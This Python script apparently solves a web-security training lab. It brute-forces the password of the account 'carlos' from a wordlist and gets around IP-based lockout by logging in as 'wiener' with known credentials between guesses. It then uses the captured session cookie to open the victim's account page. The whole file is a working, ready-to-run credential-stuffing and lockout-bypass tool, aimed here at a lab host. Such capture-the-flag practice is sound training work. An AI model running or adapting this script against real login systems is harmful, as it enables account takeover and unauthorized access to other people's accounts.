########################################################################
#
# Lab: Broken brute-force protection, IP block
#
# Hack Steps: 
#      1. Read password list
#      2. Brute force carlos password (login with as wiener before 
#         each try to bypass blocking)
#      3. Fetch carlos profile
#
########################################################################
import requests
import time
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ae0006503d5213c80e1d0d70057006c.web-security-academy.net"

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Reading password list.. ", end="", flush=True)

    password_list = read_password_list("../passwords.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Brute forcing carlos password..")  
    
    valid_session = brute_force_password(password_list)

    if valid_session != None:  
        print(Fore.WHITE + "⦗3⦘ Fetching carlos profile.. ", end="", flush=True)
        
        cookies = { "session": valid_session }
        fetch("/my-account", cookies)
        
        print_finish_message()
    else:  
        print(Fore.RED + "⦗!⦘ No valid passwords was found")


def read_password_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def brute_force_password(password_list):
    for (counter, password) in enumerate(password_list):
        # Make a valid login after every password try
        if counter % 2 == 0:
            data = { "username": "wiener", "password": "peter" }
            login_as_wiener = post_data("/login", data) 
            
            if login_as_wiener.ok:
                print(Fore.WHITE + "\n⦗#⦘ Making a successful login.. " + Fore.GREEN + "OK")
            else:
                print(Fore.WHITE + "⦗!⦘ Failed to try the password: " + Fore.RED + password)
                continue
   
        passwords_count = len(password_list)  
        print_progress(counter, passwords_count, password)
        
        data = { "username": "carlos", "password": password }
        login_as_carlos = post_data("/login", data)

        if login_as_carlos.status_code == 302:
            valid_session = login_as_carlos.cookies.get("session")
            print(Fore.WHITE + "\n🗹 Correct password: " + Fore.GREEN + password)
            return valid_session
        else:
            continue


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "\n⦗!⦘ Failed to post data to " + path + " through exception")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "\n⦗!⦘ Failed to fetch " + path + " through exception")


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME)))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed_time = int((time.time() - SCRIPT_START_TIME))  
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + " seconds")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()